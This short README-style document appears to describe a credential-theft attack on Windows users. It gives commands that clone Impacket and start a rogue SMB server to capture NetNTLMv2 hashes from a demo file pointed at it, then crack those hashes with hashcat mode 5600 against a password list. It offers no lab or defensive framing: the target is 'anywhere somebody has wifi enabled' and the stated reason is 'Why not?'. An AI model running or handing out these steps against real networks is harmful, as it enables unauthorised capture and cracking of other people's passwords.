## When
Still works as of a few moments ago

## Where
Anywhere somebody has wifi enabled and is using Windows.

## How
```
git clone https://github.com/fortra/impacket.git
cd impacket/examples
python3 ./smbserver.py rustler /mnt -debug -smb2support
```

Point the accompanying demo file towards the smbserver.  Store any hashes in hashes.txt.

Grab a copy of [hashcat](https://hashcat.net/hashcat/).  Create a list of passwords called passwords.txt.
```
hashcat -m 5600 hashes.txt passwords.txt
```

## Why
Why not?
